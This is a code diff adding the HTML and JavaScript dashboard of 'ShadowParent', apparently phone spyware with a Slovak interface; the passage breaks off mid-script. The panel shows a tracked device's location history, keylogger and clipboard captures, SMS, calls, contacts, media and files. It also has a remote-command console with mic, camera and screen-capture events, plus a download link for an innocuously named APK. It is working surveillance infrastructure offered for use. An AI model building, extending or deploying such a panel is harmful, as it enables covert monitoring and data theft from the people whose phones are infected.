@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="sk"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>ShadowParent · Dashboard</title>
+<link rel="preconnect" href="https://unpkg.com">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+:root{
+  --bg:#080b12; --bg2:#0b1120; --panel:#0f1626; --panel2:#131c2f; --panel3:#18223a;
+  --line:#1d2941; --line2:#27354f;
+  --txt:#e8eefb; --mut:#8fa1c0; --dim:#5d6e8d;
+  --acc:#4f7cff; --acc2:#7c5cff; --ok:#22c55e; --warn:#f59e0b; --bad:#ef4444; --cyan:#06b6d4;
+  --r:14px;
+  --shadow:0 18px 40px -24px rgba(0,0,0,.9);
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;background:var(--bg);color:var(--txt);
+  font:14.5px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,sans-serif;
+  -webkit-font-smoothing:antialiased;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:
+    radial-gradient(1000px 520px at 8% -12%,rgba(79,124,255,.16),transparent 60%),
+    radial-gradient(820px 460px at 102% -4%,rgba(124,92,255,.13),transparent 55%);
+}
+button,input,select,textarea{font-family:inherit}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:#1f2b42;border-radius:8px}
+::-webkit-scrollbar-track{background:transparent}
+
+/* ---------- layout ---------- */
+.app{position:relative;z-index:1;display:grid;grid-template-columns:266px 1fr;min-height:100vh}
+.side{
+  background:linear-gradient(180deg,#0c1220,#090e1a);border-right:1px solid var(--line);
+  display:flex;flex-direction:column;position:sticky;top:0;height:100vh;overflow:hidden;
+}
+.brand{display:flex;align-items:center;gap:11px;padding:18px 18px 14px}
+.logo{
+  width:38px;height:38px;border-radius:11px;display:grid;place-items:center;flex:none;
+  background:linear-gradient(135deg,var(--acc),var(--acc2));
+  box-shadow:0 10px 26px -10px rgba(79,124,255,.9);
+}
+.brand b{font-size:15.5px;letter-spacing:-.2px;display:block}
+.brand span{font-size:11px;color:var(--dim);letter-spacing:.14em;text-transform:uppercase}
+.nav{padding:6px 10px;overflow:auto;flex:1}
+.nav .grp{font-size:10.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--dim);padding:14px 10px 7px}
+.nav a{
+  display:flex;align-items:center;gap:11px;padding:9px 11px;border-radius:10px;color:var(--mut);
+  text-decoration:none;font-size:13.8px;font-weight:500;cursor:pointer;border:1px solid transparent;
+}
+.nav a svg{width:17px;height:17px;flex:none;opacity:.85}
+.nav a:hover{background:rgba(255,255,255,.04);color:var(--txt)}
+.nav a.on{background:linear-gradient(90deg,rgba(79,124,255,.22),rgba(124,92,255,.10));
+  color:#fff;border-color:rgba(79,124,255,.35)}
+.nav a.on svg{opacity:1;color:var(--acc)}
+.nav .count{margin-left:auto;font-size:11px;color:var(--dim);background:rgba(255,255,255,.05);
+  border-radius:20px;padding:1px 7px}
+.side-foot{border-top:1px solid var(--line);padding:12px}
+.dev-list{padding:4px 10px 10px;overflow:auto;max-height:44vh}
+.dev{
+  display:flex;gap:10px;align-items:center;padding:9px 10px;border-radius:11px;cursor:pointer;
+  border:1px solid transparent;
+}
+.dev:hover{background:rgba(255,255,255,.04)}
+.dev.on{background:rgba(79,124,255,.14);border-color:rgba(79,124,255,.3)}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--dim);flex:none;box-shadow:0 0 0 3px rgba(255,255,255,.04)}
+.dot.on{background:var(--ok);box-shadow:0 0 0 3px rgba(34,197,94,.18);animation:pulse 2.4s infinite}
+.dot.off{background:#3b4a66}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.35)}70%{box-shadow:0 0 0 7px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}
+.dev b{font-weight:600;font-size:13px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev small{color:var(--dim);font-size:11.5px}
+
+.main{min-width:0;display:flex;flex-direction:column}
+.top{
+  position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:14px;
+  padding:13px 22px;background:rgba(10,14,24,.82);backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line);
+}
+.hamb{display:none;background:none;border:1px solid var(--line2);border-radius:10px;
+  width:38px;height:38px;color:var(--txt);cursor:pointer;align-items:center;justify-content:center}
+.who{display:flex;align-items:center;gap:12px;min-width:0}
+.avatar{
+  width:40px;height:40px;border-radius:12px;display:grid;place-items:center;flex:none;
+  background:linear-gradient(135deg,#22304d,#182238);border:1px solid var(--line2);
+  font-size:15px;font-weight:700;color:#cfe0ff;
+}
+.who b{display:block;font-size:14.5px}
+.who small{color:var(--mut);font-size:12px}
+.spacer{flex:1}
+.search{
+  display:flex;align-items:center;gap:8px;background:#0b1220;border:1px solid var(--line);
+  border-radius:11px;padding:8px 12px;min-width:210px;
+}
+.search input{background:none;border:0;outline:none;color:var(--txt);width:100%;font-size:13.5px}
+.search svg{width:15px;height:15px;color:var(--dim)}
+.btn{
+  display:inline-flex;align-items:center;gap:7px;background:var(--panel2);border:1px solid var(--line2);
+  color:var(--txt);border-radius:10px;padding:8px 13px;font-size:13px;font-weight:600;cursor:pointer;
+  transition:.15s;white-space:nowrap;
+}
+.btn:hover{background:var(--panel3);border-color:#33456a}
+.btn.pri{background:linear-gradient(135deg,var(--acc),var(--acc2));border:0;color:#fff}
+.btn.pri:hover{filter:brightness(1.08)}
+.btn svg{width:15px;height:15px}
+.pill{
+  display:inline-flex;align-items:center;gap:7px;font-size:12px;font-weight:600;
+  border-radius:20px;padding:5px 11px;border:1px solid var(--line2);background:var(--panel2);color:var(--mut);
+}
+.pill.live{color:#8ef0b4;border-color:rgba(34,197,94,.35);background:rgba(34,197,94,.10)}
+.pill.off{color:#fca5a5;border-color:rgba(239,68,68,.32);background:rgba(239,68,68,.10)}
+
+.wrap{padding:20px 22px 40px;flex:1}
+.card{
+  background:linear-gradient(180deg,var(--panel2),var(--panel));border:1px solid var(--line);
+  border-radius:var(--r);box-shadow:var(--shadow);
+}
+.card h3{margin:0;padding:14px 16px;border-bottom:1px solid var(--line);font-size:13.5px;
+  letter-spacing:.02em;display:flex;align-items:center;gap:9px}
+.card h3 .hint{margin-left:auto;font-weight:500;color:var(--dim);font-size:11.5px}
+.grid{display:grid;gap:16px}
+.tiles{grid-template-columns:repeat(auto-fit,minmax(190px,1fr));margin-bottom:16px}
+.tile{padding:16px 17px;position:relative;overflow:hidden}
+.tile .k{font-size:11px;letter-spacing:.13em;text-transform:uppercase;color:var(--dim);display:flex;align-items:center;gap:7px}
+.tile .v{font-size:27px;font-weight:700;margin:9px 0 2px;letter-spacing:-.6px}
+.tile .s{font-size:12px;color:var(--mut)}
+.tile .spark{position:absolute;right:-6px;bottom:-10px;opacity:.16}
+.two{grid-template-columns:minmax(0,1.55fr) minmax(0,1fr)}
+.two-b{grid-template-columns:minmax(0,1fr) minmax(0,1.55fr)}
+@media(max-width:1080px){.two,.two-b{grid-template-columns:1fr}}
+.card .body{padding:16px}
+.tl{list-style:none;margin:0;padding:0}
+.tl li{display:flex;gap:12px;padding:9px 0;border-bottom:1px dashed rgba(255,255,255,.05)}
+.tl li:last-child{border-bottom:0}
+.tl .ic{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;flex:none;background:rgba(79,124,255,.12);color:#8fb0ff}
+.tl .ic svg{width:15px;height:15px}
+.tl .tx{font-size:13px;min-width:0;flex:1}
+.tl .tx em{font-style:normal;color:var(--dim);font-size:11.5px}
+.tl .tx .val{color:#cfe0ff;word-break:break-word}
+.tl .tm{font-size:11px;color:var(--dim);white-space:nowrap;margin-left:auto}
+
+table{width:100%;border-collapse:collapse}
+th{
+  text-align:left;font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--dim);
+  padding:10px 14px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#111a2c;z-index:2;
+}
+td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.045);font-size:13px;vertical-align:top}
+tbody tr:hover{background:rgba(79,124,255,.05)}
+td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12.3px}
+.scroll{max-height:520px;overflow:auto}
+.tag{
+  display:inline-block;font-size:10.5px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;
+  padding:3px 8px;border-radius:20px;background:rgba(255,255,255,.06);color:var(--mut);
+  border:1px solid var(--line2);
+}
+.tag.blue{background:rgba(79,124,255,.14);color:#9dbaff;border-color:rgba(79,124,255,.3)}
+.tag.green{background:rgba(34,197,94,.13);color:#86efac;border-color:rgba(34,197,94,.3)}
+.tag.red{background:rgba(239,68,68,.13);color:#fca5a5;border-color:rgba(239,68,68,.3)}
+.tag.amber{background:rgba(245,158,11,.13);color:#fcd34d;border-color:rgba(245,158,11,.3)}
+.tag.cyan{background:rgba(6,182,212,.13);color:#67e8f9;border-color:rgba(6,182,212,.3)}
+.tag.violet{background:rgba(124,92,255,.15);color:#c4b5fd;border-color:rgba(124,92,255,.32)}
+.empty{padding:42px 20px;text-align:center;color:var(--dim);font-size:13.5px}
+.empty svg{width:38px;height:38px;opacity:.35;margin-bottom:10px}
+#map{height:430px;border-radius:0 0 var(--r) var(--r);background:#0a1020}
+#mapMini{height:220px;border-radius:var(--r);overflow:hidden}
+.leaflet-container{background:#0a1020;font-family:inherit}
+.leaflet-popup-content-wrapper{background:#131c2f;color:var(--txt);border:1px solid var(--line2)}
+.leaflet-popup-tip{background:#131c2f}
+.leaflet-bar a{background:#131c2f;color:var(--txt);border-color:#27354f}
+.leaflet-bar a:hover{background:#1b2740}
+
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chip{
+  background:var(--panel3);border:1px solid var(--line2);color:var(--txt);border-radius:20px;
+  padding:7px 13px;font-size:12.5px;font-weight:600;cursor:pointer;transition:.15s;
+}
+.chip:hover{border-color:var(--acc);background:rgba(79,124,255,.16)}
+.chip.danger:hover{border-color:var(--bad);background:rgba(239,68,68,.14)}
+.cmdrow{display:flex;gap:9px;flex-wrap:wrap;margin-top:12px}
+.cmdrow input,.cmdrow select{
+  background:#0b1220;border:1px solid var(--line2);color:var(--txt);border-radius:10px;
+  padding:10px 12px;font-size:13.5px;outline:none;
+}
+.cmdrow input{flex:1;min-width:190px}
+.cmdrow input:focus,.cmdrow select:focus{border-color:var(--acc)}
+.gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;padding:16px}
+.gitem{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:#0b1220;cursor:pointer;transition:.15s}
+.gitem:hover{border-color:var(--acc);transform:translateY(-2px)}
+.gitem .ph{height:112px;display:grid;place-items:center;color:var(--dim);background:linear-gradient(180deg,#0d1524,#0a1020)}
+.gitem .ph svg{width:30px;height:30px;opacity:.5}
+.gitem .ph img{width:100%;height:100%;object-fit:cover;display:block}
+.gitem .nm{padding:7px 9px;font-size:11.5px;color:var(--mut);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.gitem .nm b{display:block;color:var(--txt);font-size:12px;font-weight:600}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:9px 14px;font-size:13px}
+.kv dt{color:var(--dim);font-size:12px}
+.kv dd{margin:0;word-break:break-word}
+.toast{
+  position:fixed;right:20px;bottom:20px;z-index:99;display:flex;flex-direction:column;gap:9px;
+}
+.toast div{
+  background:#162034;border:1px solid var(--line2);border-left:3px solid var(--ok);color:var(--txt);
+  padding:11px 15px;border-radius:10px;font-size:13px;box-shadow:var(--shadow);animation:in .25s ease;
+}
+.toast div.bad{border-left-color:var(--bad)}
+@keyframes in{from{opacity:0;transform:translateY(8px)}}
+.view{display:none}
+.view.on{display:block;animation:fade .22s ease}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}}
+.searchbar{display:flex;gap:9px;padding:12px 14px;border-bottom:1px solid var(--line);flex-wrap:wrap}
+.searchbar input{background:#0b1220;border:1px solid var(--line2);color:var(--txt);border-radius:9px;
+  padding:8px 11px;font-size:13px;outline:none;min-width:180px;flex:1}
+.searchbar select{background:#0b1220;border:1px solid var(--line2);color:var(--txt);border-radius:9px;
+  padding:8px 11px;font-size:13px}
+@media(max-width:920px){
+  .app{grid-template-columns:1fr}
+  .side{position:fixed;z-index:60;width:266px;transform:translateX(-100%);transition:.22s}
+  .side.open{transform:none;box-shadow:0 0 60px rgba(0,0,0,.8)}
+  .hamb{display:inline-flex}
+  .search{display:none}
+  .wrap{padding:16px 13px 34px}
+  .top{padding:11px 13px}
+}
+</style></head>
+<body>
+<div class="app">
+  <aside class="side" id="side">
+    <div class="brand">
+      <div class="logo"><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round"><path d="M12 2 4 6v6c0 5 3.4 9.4 8 10 4.6-.6 8-5 8-10V6z"/></svg></div>
+      <div><b>ShadowParent</b><span>Control panel</span></div>
+    </div>
+    <nav class="nav" id="nav">
+      <div class="grp">Monitor</div>
+      <a data-view="overview" class="on"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="3" y="3" width="7" height="9" rx="2"/><rect x="14" y="3" width="7" height="5" rx="2"/><rect x="14" y="12" width="7" height="9" rx="2"/><rect x="3" y="16" width="7" height="5" rx="2"/></svg>Prehľad</a>
+      <a data-view="location"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 21s7-6.2 7-11a7 7 0 1 0-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.6"/></svg>Poloha</a>
+      <a data-view="keylog"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M6 9h.01M10 9h.01M14 9h.01M18 9h.01M7 13h.01M11 13h.01M15 13h.01M7 16h10"/></svg>Keylog</a>
+      <a data-view="messages"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Správy</a>
+      <a data-view="calls"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1 1 .4 1.9.7 2.8a2 2 0 0 1-.5 2.1L8.1 9.9a16 16 0 0 0 6 6l1.3-1.2a2 2 0 0 1 2.1-.5c.9.3 1.8.6 2.8.7a2 2 0 0 1 1.7 2z"/></svg>Hovory</a>
+      <a data-view="contacts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.9"/></svg>Kontakty</a>
+      <div class="grp">Obsah</div>
+      <a data-view="media"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8.5" cy="8.5" r="1.6"/><path d="m21 15-5-5L5 21"/></svg>Médiá</a>
+      <a data-view="files"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/><path d="M14 2v5h5"/></svg>Súbory</a>
+      <div class="grp">Ovládanie</div>
+      <a data-view="commands"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m4 17 6-6-6-6"/><path d="M12 19h8"/></svg>Príkazy</a>
+    </nav>
+    <div class="grp" style="padding:2px 20px 6px">Zariadenia</div>
+    <div class="dev-list" id="devList"></div>
+    <div class="side-foot">
+      <div style="display:flex;gap:8px">
+        <a class="btn" style="flex:1;justify-content:center" href="/apk/android_UI.apk" download>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0 4-4m-4 4-4-4"/><path d="M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2"/></svg>APK</a>
+        <a class="btn" style="flex:1;justify-content:center" href="/logout">Odhlásiť</a>
+      </div>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="top">
+      <button class="hamb" id="hamb" aria-label="menu">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 6h16M4 12h16M4 18h16"/></svg>
+      </button>
+      <div class="who" id="who">
+        <div class="avatar" id="avatar">—</div>
+        <div style="min-width:0">
+          <b id="devName">Vyber zariadenie</b>
+          <small id="devSub">Zatiaľ žiadne dáta</small>
+        </div>
+      </div>
+      <div class="spacer"></div>
+      <div class="search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
+        <input id="globalSearch" placeholder="Hľadať v udalostiach…">
+      </div>
+      <span class="pill" id="livePill"><span class="dot"></span> offline</span>
+      <button class="btn" id="refreshBtn" title="Obnoviť">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 12a9 9 0 1 1-2.6-6.4"/><path d="M21 3v6h-6"/></svg>
+      </button>
+    </header>
+
+    <div class="wrap">
+      <!-- OVERVIEW -->
+      <section class="view on" id="v-overview">
+        <div class="grid tiles" id="tiles"></div>
+        <div class="grid two">
+          <div class="card">
+            <h3>Činnosť zariadenia<span class="hint" id="tlHint"></span></h3>
+            <div class="body"><ul class="tl" id="timeline"></ul></div>
+          </div>
+          <div style="display:grid;gap:16px;align-content:start">
+            <div class="card">
+              <h3>Profil zariadenia</h3>
+              <div class="body"><dl class="kv" id="profile"></dl></div>
+            </div>
+            <div class="card">
+              <h3>Posledná poloha</h3>
+              <div id="mapMini"></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- LOCATION -->
+      <section class="view" id="v-location">
+        <div class="card" style="margin-bottom:16px">
+          <h3>Mapa sledovania<span class="hint" id="locHint"></span></h3>
+          <div id="map"></div>
+        </div>
+        <div class="card">
+          <h3>História polôh<span class="hint">novšie hore</span></h3>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:150px">Čas</th><th>Poloha</th><th>Presnosť</th><th>Zdroj</th></tr></thead>
+            <tbody id="locRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- KEYLOG -->
+      <section class="view" id="v-keylog">
+        <div class="card">
+          <h3>Klávesnica a aplikácie<span class="hint" id="keyHint"></span></h3>
+          <div class="searchbar">
+            <input id="keySearch" placeholder="Hľadať v textoch…">
+            <select id="keyKind">
+              <option value="">všetky typy</option>
+              <option value="keylog">keylog</option>
+              <option value="clipboard">clipboard</option>
+              <option value="text">text</option>
+            </select>
+          </div>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:150px">Čas</th><th style="width:190px">Aplikácia</th><th>Obsah</th></tr></thead>
+            <tbody id="keyRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- MESSAGES -->
+      <section class="view" id="v-messages">
+        <div class="card">
+          <h3>SMS správy<span class="hint" id="smsHint"></span></h3>
+          <div class="searchbar"><input id="smsSearch" placeholder="Hľadať v správach…"></div>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:150px">Čas</th><th style="width:170px">Odosielateľ</th><th>Text</th></tr></thead>
+            <tbody id="smsRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- CALLS -->
+      <section class="view" id="v-calls">
+        <div class="card">
+          <h3>História hovorov<span class="hint" id="callHint"></span></h3>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:150px">Čas</th><th style="width:190px">Kontakt</th><th>Typ</th><th style="width:120px">Trvanie</th></tr></thead>
+            <tbody id="callRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- CONTACTS -->
+      <section class="view" id="v-contacts">
+        <div class="card">
+          <h3>Kontakty<span class="hint" id="contactHint"></span></h3>
+          <div class="searchbar">
+            <input id="contactSearch" placeholder="Hľadať meno alebo číslo…">
+            <button class="btn" onclick="runCmd('contacts')">Stiahnuť kontakty</button>
+          </div>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:280px">Meno</th><th>Telefón</th></tr></thead>
+            <tbody id="contactRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- MEDIA -->
+      <section class="view" id="v-media">
+        <div class="card">
+          <h3>Fotky, video a snímky obrazovky<span class="hint" id="mediaHint"></span></h3>
+          <div class="gallery" id="gallery"></div>
+        </div>
+      </section>
+
+      <!-- FILES -->
+      <section class="view" id="v-files">
+        <div class="card">
+          <h3>Stiahnuté súbory<span class="hint" id="fileHint"></span></h3>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:150px">Čas</th><th style="width:120px">Typ</th><th>Názov</th><th style="width:100px">Veľkosť</th><th style="width:90px"></th></tr></thead>
+            <tbody id="fileRows"></tbody></table></div>
+        </div>
+      </section>
+
+      <!-- COMMANDS -->
+      <section class="view" id="v-commands">
+        <div class="card" style="margin-bottom:16px">
+          <h3>Ovládanie zariadenia</h3>
+          <div class="body">
+            <div class="chips" id="cmdChips"></div>
+            <div class="cmdrow">
+              <select id="cmdSel"></select>
+              <input id="cmdArgs" placeholder='Argumenty (JSON), napr. {"sec":30}'>
+              <button class="btn pri" id="cmdSend">Odoslať</button>
+            </div>
+            <div style="margin-top:10px;font-size:12px;color:var(--dim)" id="cmdMsg"></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>História príkazov<span class="hint">doručené = zariadenie príkaz prevzalo</span></h3>
+          <div class="scroll"><table>
+            <thead><tr><th style="width:70px">#</th><th style="width:160px">Čas</th><th style="width:130px">Príkaz</th><th>Argumenty</th><th style="width:120px">Stav</th></tr></thead>
+            <tbody id="cmdRows"></tbody></table></div>
+        </div>
+      </section>
+    </div>
+  </main>
+</div>
+<div class="toast" id="toast"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+const S = {device:null, view:'overview', devices:[], map:null, mini:null, track:null, q:''};
+const $ = id => document.getElementById(id);
+const esc = s => (s==null?'':String(s)).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const fmtT = ts => ts ? new Date(ts).toLocaleString('sv-SE',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit'}) : '—';
+const fmtAgo = ts => { if(!ts) return 'nikdy'; const s=Math.floor((Date.now()-ts)/1000);
+  if(s<60) return 'pred '+s+' s'; if(s<3600) return 'pred '+Math.floor(s/60)+' min';
+  if(s<86400) return 'pred '+Math.floor(s/3600)+' h'; return 'pred '+Math.floor(s/86400)+' d'; };
+const j = async u => { const r = await fetch(u,{cache:'no-store'}); if(!r.ok) return null; return r.json(); };
+const qs = o => Object.entries(o).filter(([,v])=>v!==''&&v!=null).map(([k,v])=>k+'='+encodeURIComponent(v)).join('&');
+
+const ICONS = {
+  boot:'<path d="M12 2 4 6v6c0 5 3.4 9.4 8 10 4.6-.6 8-5 8-10V6z"/>',
+  heartbeat:'<path d="M3 12h4l3-7 4 14 3-7h4"/>',
+  health:'<path d="M3 12h4l2-5 4 10 2-5h6"/>',
+  location:'<path d="M12 21s7-6.2 7-11a7 7 0 1 0-14 0c0 4.8 7 11 7 11z"/><circle cx="12" cy="10" r="2.6"/>',
+  keylog:'<rect x="2" y="5" width="20" height="14" rx="3"/><path d="M6 9h.01M10 9h.01M14 9h.01M18 9h.01M7 13h.01M11 13h.01M15 13h.01M7 16h10"/>',
+  sms:'<path d="M21 15a2 2 0 0 1-2 2H8l-5 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>',
+  call:'<path d="M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1 1 .4 1.9.7 2.8a2 2 0 0 1-.5 2.1L8.1 9.9a16 16 0 0 0 6 6l1.3-1.2a2 2 0 0 1 2.1-.5c.9.3 1.8.6 2.8.7a2 2 0 0 1 1.7 2z"/>',
+  media:'<rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8.5" cy="8.5" r="1.6"/><path d="m21 15-5-5L5 21"/>',
+  file:'<path d="M14 2H7a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7z"/><path d="M14 2v5h5"/>',
+  usage:'<rect x="4" y="4" width="16" height="16" rx="3"/><path d="M9 9h6v6H9z"/>',
+  clipboard:'<rect x="8" y="3" width="8" height="4" rx="1"/><path d="M16 5h2a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h2"/>',
+  mic:'<rect x="9" y="3" width="6" height="11" rx="3"/><path d="M5 11a7 7 0 0 0 14 0M12 18v3"/>',
+  camera:'<path d="M3 8a2 2 0 0 1 2-2h2l2-2h6l2 2h2a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><circle cx="12" cy="13" r="3.4"/>',
+  screen:'<rect x="2" y="4" width="20" height="13" rx="2"/><path d="M8 21h8"/>',
+  crash:'<path d="M12 2 1 21h22z"/><path d="M12 9v5M12 17h.01"/>',
+  alive:'<circle cx="12" cy="12" r="8"/><path d="M8 12h8M12 8v8"/>',
+  startup:'<path d="M12 2v4M12 18v4M2 12h4M18 12h4"/><circle cx="12" cy="12" r="4"/>',
+  config:'<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.6 1.6 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.6 1.6 0 0 0-2.7 1.1V21a2 2 0 1 1-4 0v-.1A1.6 1.6 0 0 0 7 19.4a1.6 1.6 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.6 1.6 0 0 0-1.1-2.7H1a2 2 0 1 1 0-4h.1A1.6 1.6 0 0 0 2.6 7a1.6 1.6 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1A1.6 1.6 0 0 0 7 2.6h.1A1.6 1.6 0 0 0 8.7 1V1a2 2 0 1 1 4 0v.1A1.6 1.6 0 0 0 15 2.6h.1a1.6 1.6 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.6 1.6 0 0 0-.3 1.8v.1a1.6 1.6 0 0 0 1.5 1h.1a2 2 0 1 1 0 4H21a1.6 1.6 0 0 0-1.5 1z"/>',
+  default:'<circle cx="12" cy="12" r="8"/>'
+};
+const icon = k => `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"
+  stroke-linecap="round" stroke-linejoin="round">${ICONS[k]||ICONS.default}</svg>`;
+
+function kindTag(k){
+  const base=k.replace('beacon:','');
+  const map={boot:'blue',heartbeat:'green',health:'green',alive:'green',location:'cyan',keylog:'violet',
+    clipboard:'amber',sms:'blue',call:'amber',media:'violet',file:'blue',usage:'cyan',mic:'red',
+    camera:'red',screen:'red',crash:'red',startup:'blue',config:'amber'};
+  return `<span class="tag ${map[base]||''}">${esc(base)}</span>`;
+}
+function toast(msg,bad){
+  const d=document.createElement('div'); if(bad) d.className='bad'; d.textContent=msg;
+  $('toast').appendChild(d); setTimeout(()=>d.remove(),4200);
+}
+function parsePayload(p){
+  try { const o=JSON.parse(p); return (o&&typeof o==='object')?o:null; } catch(e){ return null; }
+}
+function pickText(o, keys){
+  if(!o) return '';
+  for(const k of keys){ if(o[k]!=null && String(o[k]).trim()!=='') return String(o[k]); }
+  return '';
+}
+
+/* ---------- devices ---------- */
+async function loadDevices(){
+  S.devices = await j('/api/devices') || [];
+  const list=$('devList');
+  if(!S.devices.length){ list.innerHTML='<div style="padding:10px 12px;color:var(--dim);font-size:12.5px">Žiadne zariadenia</div>'; return; }
+  list.innerHTML = S.devices.map(d=>{
+    const on = d.last_seen && (Date.now()-d.last_seen)<120000;
+    const nm = (d.model||d.device_id||'?');
+    return `<div class="dev ${S.device===d.device_id?'on':''}" onclick="selectDevice('${d.device_id}')">
+      <span class="dot ${on?'on':'off'}"></span>
+      <div style="min-width:0"><b>${esc(nm)}</b><small>${esc((d.device_id||'').slice(0,10))} · ${fmtAgo(d.last_seen)}</small></div>
+    </div>`;
+  }).join('');
+}
+function selectDevice(id){ S.device=id; localStorage.setItem('sp_device',id); loadDevices(); renderAll(); }
+
+/* ---------- overview ---------- */
+async function loadOverview(){
+  if(!S.device) return;
+  const d = await j('/api/device/'+encodeURIComponent(S.device));
+  if(!d) return;
+  const dev=d.device||{}, meta=d.meta||{}, c=d.counts||{}, loc=d.last_location||{};
+  const online = d.online;
